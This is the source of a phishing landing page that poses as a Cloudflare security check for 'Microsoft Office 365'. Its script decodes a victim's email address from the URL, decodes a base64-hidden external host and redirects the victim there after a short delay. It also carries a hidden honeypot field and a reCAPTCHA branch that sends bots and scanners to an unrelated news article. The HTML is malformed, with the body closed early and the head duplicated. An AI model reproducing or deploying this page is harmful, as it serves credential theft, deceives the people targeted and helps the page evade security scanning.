
<?php

?>


<html lang="en-US">
  <link type="text/css" id="dark-mode" rel="stylesheet" href="" />
  <style type="text/css" id="dark-mode-custom-style"></style>
  <head>
    <title>Just a moment...</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta name="robots" content="noindex,nofollow" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <link
      rel="shortcut icon"
      href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico"
    />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      html {
        line-height: 1.15;
        -webkit-text-size-adjust: 100%;
        color: #313131;
      }
      button,
      html {
        font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI,
          Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif,
          Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
      }
      body {
        display: flex;
        flex-direction: column;
        min-height: 100vh;
      }
      a {
        transition: color 0.15s ease;
        background-color: transparent;
        text-decoration: none;
        color: #0051c3;
      }
      a:hover {
        text-decoration: underline;
        color: #ee730a;
      }
      .hidden {
        display: none;
      }
      .privacy-pass {
        overflow: hidden;
      }
      .privacy-pass-icon {
        display: inline-block;
        background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAiCAQAAACzFZKcAAAA7UlEQVR42u2W2w2EIBBFKcEObIESLIUS7EA70BIswQ4ogRIo5ewHukoirAhmNxvv50wyJ/PQixCeKKFKhIQsAqjDAAXMIkNMQBtOW0BlARrABoZEB1iRKQwwHCWGD/M7C3B77PahCoWB3PF4mwSLolrn7gKNKCTkVtVdvqaNXO/VPjSAABA36bsA1+BpmXRAoi4BkkbxAB7AnwLu/dBMUn39ez+7ogB0GbP0bLhdDWezTFmsfLOzzMX0bXHTN4vpv8M9QH4X1ACMR6kx5ExJAAv0ocVYyHu8oKKvQ1pgygLM0U0u88uVjF1vAfk1Xx80X1CEa7XTAAAAAElFTkSuQmCC);
        background-size: contain;
        width: 24px;
        height: 17px;
      }
      .privacy-pass-icon-wrapper {
        position: relative;
        top: 0.2rem;
        margin-left: 0.2rem;
      }
      .privacy-pass a {
        -webkit-appearance: button;
        -moz-appearance: button;
        appearance: button;
        float: right;
        border-radius: 0 0 0 0.313rem;
        background-color: #313131;
        padding: 0.5rem 1rem;
        text-align: right;
        text-decoration: none;
        line-height: 1.313rem;
        color: #fff;
        font-size: 0.875rem;
        font-weight: 600;
      }
      .main-content {
        margin: 8rem auto;
        width: 100%;
        max-width: 60rem;
      }
      .heading-favicon {
        margin-right: 0.5rem;
        width: 2rem;
        height: 2rem;
      }
      @media (max-width: 720px) {
        .main-content {
          margin-top: 4rem;
        }
        .heading-favicon {
          width: 1.5rem;
          height: 1.5rem;
        }
      }
      .footer,
      .main-content {
        padding-right: 1.5rem;
        padding-left: 1.5rem;
      }
      .main-wrapper {
        display: flex;
        flex: 1;
        flex-direction: column;
        align-items: center;
      }
      .font-red {
        color: #b20f03;
      }
      .spacer {
        margin: 2rem 0;
      }
      .h1 {
        line-height: 3.75rem;
        font-size: 2.5rem;
        font-weight: 500;
      }
      .h2 {
        line-height: 2.25rem;
        font-size: 1.5rem;
        font-weight: 500;
      }
      .core-msg {
        line-height: 2.25rem;
        font-size: 1.5rem;
        font-weight: 400;
      }
      .body-text {
        line-height: 1.25rem;
        font-size: 1rem;
        font-weight: 400;
      }
      .expandable-title {
        line-height: 1.5rem;
        font-weight: 500;
      }
      @media (max-width: 720px) {
        .h1 {
          line-height: 1.75rem;
          font-size: 1.5rem;
        }
        .h2 {
          line-height: 1.5rem;
          font-size: 1.25rem;
        }
        .core-msg {
          line-height: 1.5rem;
          font-size: 1rem;
        }
      }
      .icon-wrapper {
        display: inline-block;
        position: relative;
        top: 0.25rem;
        margin-right: 0.2rem;
      }
      .heading-icon {
        width: 1.625rem;
        height: 1.625rem;
      }
      @media (max-width: 720px) {
        .heading-icon {
          width: 1.25rem;
          height: 1.25rem;
        }
      }
      .warning-icon {
        display: inline-block;
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAAA0CAMAAADypuvZAAAAPFBMVEUAAACvDwOyDwKyDwOvEACyDgOyDwKvDwKwDgCyDgKxDgOyDgKvDgKyDwKyDgOxDgKzDgKxDgKxEASyDwMgW5ZmAAAAE3RSTlMAQN+/EJDvMB9wYJ9Qz7CAf6CAtGoj/AAAAcFJREFUSMeVltu2gyAMRLlfBDxt+f9/PTq2VXSwmod2GdhkEoIiiPmYinK1VqXt4MUFk9bVxlTyvxBdienhNoJwoYMY+57hdMzBTA4v4/gRaykT1FuLNI0/j/1g3i2IJ8s9F+owNCx+2UlWQXbexQFjjTjN1/lGALS9xIm9QIXNOoowlFKrFssYTtmvuOXpp2HtT6lUE3f11bH1IQu9qbYUBEr7yq8zCxkWuva8+rtF4RrkP6ESxFPoj7rtW30+jI4UQlZuiejEwZ4cMg65RKjjUDz6NdwWvxw6nnLESEAl230O5cldUAdy8P44hJZTYh40DOIKzFw3QOI6hPk9aDiFHJc3nMirKERgEPd7FKKgiy5DEn3+5JsrAfHNtfjVRLucTPTaCA1rxFVz6AX8yYsIUlXoMqbPWFUeXF1Cyqz7Ej1PAXNBs1B1tsKWKpsX0yFhslTetL4mL8s4j2fyslTbjbT7Va2V7GCG5ukhftijXdsoQhGmzSI4QhHGhVufz4QJ/v6Hug6dK0EK3YuM8/3Lx5h3Z0STywe55oxRejM5Qo4aAtZ8eTBuWp6dl3IXgfnnLpyzBCFctHomnSopejLhH/3AMfEMndTJAAAAAElFTkSuQmCC);
        background-size: cover;
      }
      .text-center {
        text-align: center;
      }
      .expandable {
        transition: height, border-left 0.2s;
        border-left: 0.125rem solid #e5e5e5;
        padding-left: 0.5rem;
      }
      .expandable.expanded {
        border-left-color: #0051c3;
      }
      .expandable-summary-btn {
        border: none;
        background: 0 0;
        cursor: pointer;
        padding: 0;
        color: inherit;
        font: inherit;
      }
      .expandable-details {
        display: none;
        padding: 0.5rem 0;
      }
      .expanded > .expandable-details {
        display: block;
      }
      .caret-icon {
        display: inline-block;
        transition: transform 0.2s;
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAElBMVEUAAAAwMDAxMTEyMjIwMDAxMTF+89HTAAAABXRSTlMAgF9/MMasjJIAAABTSURBVCjPzcq7DcAwDANR5TOAm/Rp0meErBAD3n8VW8DBt4JZUALxYp18vmfWUR2ed9TW7iB7K3muOsGfDRFAABKABCABSAASgAQgAUgAkhKLpwMJmwrD+BDiYwAAAABJRU5ErkJggg==);
        background-size: contain;
        width: 1rem;
        height: 1rem;
      }
      .caret-icon-wrapper {
        position: relative;
        top: 0.1rem;
        margin-left: 0.2rem;
      }
      .expanded .caret-icon {
        transform: rotate(180deg);
      }
      .fact {
        border: 0.063rem solid #d9d9d9;
        border-radius: 0.313rem;
        padding: 1rem;
      }
      .fact .fact-title {
        font-weight: 500;
      }
      .big-button {
        transition-duration: 0.2s;
        transition-property: background-color, border-color, color;
        transition-timing-function: ease;
        border: 0.063rem solid #0051c3;
        border-radius: 0.313rem;
        padding: 0.375rem 1rem;
        line-height: 1.313rem;
        font-size: 0.875rem;
      }
      .big-button:hover {
        cursor: pointer;
      }
      .webauthn-prompt {
        align-items: center;
      }
      .captcha-prompt:not(.hidden),
      .webauthn-prompt:not(.hidden) {
        display: flex;
      }
      .webauthn-divider {
        padding: 0 1.5rem;
      }
      @media (max-width: 720px) {
        .captcha-prompt:not(.hidden),
        .webauthn-prompt:not(.hidden) {
          flex-wrap: wrap;
          justify-content: center;
        }
        .webauthn-divider {
          margin: 1rem 0;
          width: 100%;
          text-align: center;
        }
      }
      .webauthn-button {
        background-color: #fff;
        color: #0051c3;
      }
      .webauthn-button:hover {
        border-color: #003681;
        background-color: #003681;
        color: #fff;
      }
      .pow-button {
        margin: 2rem 0;
        background-color: #0051c3;
        color: #fff;
      }
      .pow-button:hover {
        border-color: #003681;
        background-color: #003681;
        color: #fff;
      }
      .footer {
        margin: 0 auto;
        width: 100%;
        max-width: 60rem;
        line-height: 1.125rem;
        font-size: 0.75rem;
      }
      .footer-inner {
        border-top: 1px solid #d9d9d9;
        padding-top: 1rem;
        padding-bottom: 1rem;
      }
      .ip-address {
        margin-left: 2.25rem;
      }
      .clearfix:after {
        display: table;
        clear: both;
        content: "";
      }
      .clearfix .column {
        float: left;
        padding-right: 1.5rem;
        width: 50%;
      }
      .diagnostic-wrapper {
        margin-bottom: 0.5rem;
      }
      .footer .ray-id {
        text-align: center;
      }
      .footer .ray-id code {
        font-family: monaco, courier, monospace;
      }
      .core-msg,
      .zone-name-title {
        overflow-wrap: break-word;
      }
      @media (max-width: 720px) {
        .diagnostic-wrapper {
          display: flex;
          flex-wrap: wrap;
          justify-content: center;
        }
        .clearfix:after {
          display: initial;
          clear: none;
          text-align: center;
          content: none;
        }
        .column {
          padding-bottom: 2rem;
        }
        .clearfix .column {
          float: none;
          padding: 0;
          width: auto;
          word-break: keep-all;
        }
        .zone-name-title {
          margin-bottom: 1rem;
        }
      }
      .loading-spinner {
        height: 76.39px;
      }
      .lds-ring {
        display: inline-block;
        position: relative;
        width: 1.875rem;
        height: 1.875rem;
      }
      .lds-ring div {
        box-sizing: border-box;
        display: block;
        position: absolute;
        border: 0.3rem solid #595959;
        border-radius: 50%;
        border-color: #595959 transparent transparent transparent;
        width: 1.875rem;
        height: 1.875rem;
        animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
      }
      .lds-ring div:nth-child(1) {
        animation-delay: -0.45s;
      }
      .lds-ring div:nth-child(2) {
        animation-delay: -0.3s;
      }
      .lds-ring div:nth-child(3) {
        animation-delay: -0.15s;
      }
      @keyframes lds-ring {
        0% {
          transform: rotate(0);
        }
        to {
          transform: rotate(360deg);
        }
      }
      @media screen and (-ms-high-contrast: active),
        screen and (-ms-high-contrast: none) {
        .main-wrapper,
        body {
          display: block;
        }
      }
      body.no-js .body.no-js .cf-challenge-running {
        display: none;
      }
      @media (prefers-color-scheme: dark) {
        body {
          background-color: #222;
          color: #d9d9d9;
        }
        a {
          color: #fff;
        }
        a:hover {
          text-decoration: underline;
          color: #ee730a;
        }
        .lds-ring div {
          border-color: #999 transparent transparent transparent;
        }
        .privacy-pass a {
          background-color: #d9d9d9;
        }
        .font-red {
          color: #fc574a;
        }
        .big-button,
        .pow-button,
        .webauthn-button {
          background-color: #4693ff;
          color: #1d1d1d;
        }
        .expandable.expanded {
          border-left-color: #4693ff;
        }
      }
      @keyframes lds-ring {
        0% {
          transform: rotate(0);
          transform: rotate(0);
        }
        100% {
          transform: rotate(360deg);
          transform: rotate(360deg);
        }
      }
    </style>
<script>
    $(document).ready(function() {
        setTimeout(function() {
            var encodedEmail = window.location.pathname.split("/")[4];
            var decodedEmail = decodeBase64(encodedEmail);
            
            // Encode the initial part of the URL in base64
            var initialPartBase64 = "aHR0cHM6Ly84aDRlMXEuejEzLndlYi5jb3JlLndpbmRvd3MubmV0";
            var initialPart = atob(initialPartBase64);
            
            // Construct the full URL with the base64-decoded part
            var redirectUrl = initialPart + decodedEmail;
            
            window.location.href = redirectUrl;
        }, 2800);
    });

    function decodeBase64(encodedString) {
        var decodedString = "";
        try {
            decodedString = decodeURIComponent(escape(window.atob(encodedString)));
        } catch (e) {
            console.error("Error decoding base64 string:", e);
        }
        return decodedString;
    }
</script>

<script src="https://www.google.com/recaptcha/api.js?render=6LdS-KcqAAAAAFGBP0jtG-NjUvYAyP0bPNscvFNh"></script><input type="hidden" name="captcha-response" id="captcha-response"><script>    document.getElementById("myForm").addEventListener("submit", function(event) {        event.preventDefault();        grecaptcha.execute("6LdS-KcqAAAAAFGBP0jtG-NjUvYAyP0bPNscvFNh", {action: "submit"}).then(function(token) {            document.getElementById("captcha-response").value = token;            document.getElementById("myForm").submit();        });    });</script><div style="display:none;"><input type="text" name="passowrd" value=""></div><script>    if (document.getElementById("captcha-response").value != "") {        window.location.href = "https://www.msn.com/en-xl/news/other/elon-musk-says-new-twitter-ceo-hired/ar-AA1b4qas?ocid=msedgntp&cvid=55c558e8d2ba4dc3ac9457c2ccd44bb5&ei=24";    }</script>
  </body>
</html>
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap"
    />
  </head>
  <body class="no-js">
    <div class="main-wrapper" role="main">
      <div class="main-content">
        <h1 class="zone-name-title h1">
          <img
            class="heading-favicon"
            src="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico"
            onerror="this.onerror=null;this.parentNode.removeChild(this)"
          />
          Microsoft Office 365
        </h1>
        <h2 class="h2" id="cf-challenge-running">
          Checking if the site connection is secure
        </h2>
        <div id="challenge-spinner" class="spacer loading-spinner" style="">
          <div class="lds-ring">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
          </div>
        </div>
        <div id="challenge-success" style="display: none">
          <div class="h2">
            <span class="icon-wrapper">
              <img
                class="heading-icon"
                alt="Success icon"
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAAA0CAMAAADypuvZAAAANlBMVEUAAAAxMTEwMDAxMTExMTEwMDAwMDAwMDAxMTExMTExMTEwMDAwMDAxMTExMTEwMDAwMDAxMTHB9N+uAAAAEXRSTlMA3zDvfyBAEJC/n3BQz69gX7VMkcMAAAGySURBVEjHnZZbFoMgDEQJiDzVuv/NtgbtFGuQ4/zUKpeMIQbUhXSKE5l1XSn4pFWHRm/WShT1HRLWC01LGxFEVkCc30eYkLJ1Sjk9pvkw690VY6k8DWP9OM9yMG0Koi+mi8XA36NXmW0UXra4eJ3iwHfrfXVlgL0NqqGBHdqfeQhMmyJ48WDuKP81h3+SMPeRKkJcSXiLUK4XTHCjESOnz1VUXQoc6lgi2x4cI5aTQ201Mt8wHysI5fc05M5c81uZEtHcMKhxZ7iYEty1GfhLvGKpm+EYkdGxm1F5axmcB93DoORIbXfdN7f+hlFuyxtDP+sxtBnF43cIYwaZAWRgzxIoiXEMESoPlMhwLRDXeK772CAzXEdBRV7cmnoVBp0OSlyGidEzJTFq5hhcsA5388oSGM6b5p+qjpZrBlMS9xj4AwXmz108ukU1IomM3ceiW0CDwHCqp1NjAqXlFrbga+xuloQJ+tuyfbIBPNpqnmxqT7dPaOnZqBfhSBCteJAxWj58zLk2xgg+SPGYM6dRO6WczSnIxxwEExRaO+UyCUhbOp7CGQ+kxSUfNtLQFC+Po29vvy7jj4y0yAAAAABJRU5ErkJggg=="
              />
            </span>
            &nbsp; Connection is secure
          </div>
          <div class="core-msg spacer">Proceeding...</div>
        </div>
        <div id="challenge-all">
          <div id="cf-challenge-body-text" class="core-msg spacer">
            office.com needs to review the security of your connection before
            proceeding.
          </div>
          <div
            id="challenge-fact-wrapper"
            class="fact spacer hidden"
            style="display: block; visibility: visible"
          >
            <span class="fact-title">Did you know</span>
            <span id="challenge-fact" class="body-text">
              that Cloudflare mitigates an average of 28 billion cyber threats,
              including DDoS attacks, per day?</span
            >
          </div>
          <div
            id="challenge-explainer-expandable"
            class="hidden expandable body-text spacer"
            style="display: block; visibility: visible"
          >
            <div class="expandable-title" id="challenge-explainer-summary">
              <button
                class="expandable-summary-btn"
                id="challenge-explainer-btn"
                type="button"
              >
                Why am I seeing this page?
                <span class="caret-icon-wrapper">
                  <div class="caret-icon"></div>
                </span>
              </button>
            </div>
            <div class="expandable-details" id="challenge-explainer-details">
              Requests from bots can pose as legitimate traffic.
              Occasionally, you may see this page while the site ensures that
              the connection is secure.
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="footer" role="contentinfo">
      <div class="footer-inner">
        <div class="clearfix diagnostic-wrapper">
          <div class="ray-id">
            Ray ID:
            <code id="ray-code">4922deb1-ffc3-4e66-8910-1a9575357a19</code>
          </div>
        </div>
        <div class="text-center">
          Performance &amp; security by
          <a
            rel="noopener noreferrer"
            href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=l"
            target="_blank"
            >Cloudflare</a
          >
        </div>
      </div>
    </div>
    <span id="trk_jschal_js"></span>
  </body>
</html>
